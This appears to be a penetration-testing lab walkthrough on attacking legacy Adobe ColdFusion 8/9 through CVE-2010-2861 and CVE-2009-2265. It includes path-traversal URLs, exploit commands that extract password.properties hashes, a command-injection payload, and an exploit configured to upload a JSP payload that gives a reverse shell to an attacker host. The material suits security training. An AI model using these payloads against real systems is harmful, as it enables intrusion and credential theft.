> ⚠️ CVE-2010-2861 and CVE-2009-2265 target unpatched ColdFusion 8/9 — legacy but still commonly found in the wild. Confirm exact version before selecting an exploit.

---
## 1. Finding Known Exploits — Searchsploit

```bash
searchsploit adobe coldfusion
```

Key hits for a **ColdFusion 8** target:

|Exploit|Path|
|---|---|
|Adobe ColdFusion - Directory Traversal|`multiple/remote/14641.py`|
|Adobe ColdFusion 8 - Remote Command Execution (RCE)|`cfm/webapps/50057.py`|

> Searchsploit pulls from the Exploit Database — always cross-check the exact version/patch level against the CVE's affected range before firing.

---

## 2. Directory Traversal (CVE-2010-2861)

### What It Is

Classic path traversal via unvalidated input passed into ColdFusion's file/directory-handling tags (`CFFile`, `CFDIRECTORY`).

**Vulnerable pattern example:**

```html
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>
```

If the `directory` value comes from unsanitized user input:

```
http://example.com/index.cfm?directory=../../../etc/&file=passwd
```

### CVE-2010-2861 Specifics

Affects ColdFusion **9.0.1 and earlier**. Vulnerable endpoints (traversal via the `locale` parameter):

```
CFIDE/administrator/settings/mappings.cfm
logging/settings.cfm
datasources/index.cfm
j2eepackaging/editarchive.cfm
CFIDE/administrator/enter.cfm
```

**Exploitation pattern:**

```
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

### Step 1 — Pull the Exploit

```bash
searchsploit -p 14641
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
```

### Step 2 — Check Usage

```bash
python2 14641.py
```

```
usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
```

### Step 3 — Target `password.properties`

This file (usually `[cf_root]/lib/password.properties`) stores **encrypted credentials** for DB connections, mail servers, LDAP, etc. — auto-used by ColdFusion without manual entry.

```bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

```
------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
------------------------------
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
```

> Success confirms the target is vulnerable to CVE-2010-2861. The RDS/admin password hashes can potentially be cracked or used for further access.

---

## 3. Unauthenticated Remote Code Execution (CVE-2009-2265)

### RCE vs. Unauthenticated RCE

|Type|Requirement|
|---|---|
|**RCE**|Attacker executes arbitrary code — may still require some prior access/credentials|
|**Unauthenticated RCE**|Arbitrary code execution with **zero authentication** — most dangerous class|

### How It Happens (Conceptually)

Occurs when a feature (e.g., debug console, file upload) executes attacker-influenced input without auth or sanitization.

**Illustrative vulnerable pattern:**

```html
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```

Unsanitized `cgi.query_string` fed directly into `cmd.exe` execution — classic command injection.

**Example payload (URL-encoded):**

```
http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
```

Decoded: `index.cfm?; echo "This server has been compromised!" > C:\compromise.txt`

### CVE-2009-2265 Specifics

- Affects **ColdFusion 8.0.1 and earlier**.
- Vulnerability lives in the bundled **FCKeditor** file upload package.
- Vulnerable endpoint:

```
http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

- Allows **unauthenticated file upload** → drop a JSP/webshell payload → RCE.

### Step 1 — Pull the Exploit

```bash
searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

### Step 2 — Configure the Exploit

Edit the script's config block:

```python
lhost = '10.10.14.55'   # Attack host IP
lport = 4444             # Unused local port
rhost = "10.129.247.30"  # Target IP
rport = 8500              # Target ColdFusion port
filename = uuid.uuid4().hex
```

### Step 3 — Run It

```bash
python3 50057.py
```

Exploit flow (from output):

1. Generates a **JSP payload** (random UUID filename).
2. Uploads it via multipart/form-data POST to the vulnerable FCKeditor endpoint.
3. Server confirms via a JS callback (`OnUploadCompleted`).
4. Script deletes the payload from disk (post-execution cleanup) while a listener catches the callback.
5. Starts an `ncat` listener and triggers execution.

```
Ncat: Listening on :::4444
Ncat: Connection from 10.129.247.30:49866.
```

### Result — Reverse Shell

```cmd
C:\ColdFusion8\runtime\bin>dir
Volume in drive C has no label.
...
```

Full shell access on the ColdFusion server.

---

## Summary

|CVE|Vuln Type|Exploit|Impact|
|---|---|---|---|
|**CVE-2010-2861**|Directory Traversal|`14641.py`|Read `password.properties` (encrypted service creds)|
|**CVE-2009-2265**|Unauthenticated File Upload → RCE|`50057.py`|Full reverse shell, no auth needed|

## Key Takeaways

- Directory traversal in ColdFusion is commonly exploited through the `locale` parameter on multiple admin-facing `.cfm` endpoints — not just a generic `../` in a file path.
- `password.properties` is a high-value target once traversal is confirmed — it holds encrypted creds for every backend service ColdFusion talks to.
- CVE-2009-2265 (FCKeditor upload flaw) requires **zero credentials** — treat any legacy ColdFusion 8.0.1-or-earlier instance as a near-immediate RCE risk.
- Both exploits are legacy (Python 2/3 scripts from Exploit-DB) — expect to need `python2` specifically for some, and always review/patch exploit scripts (IP/port config) before running.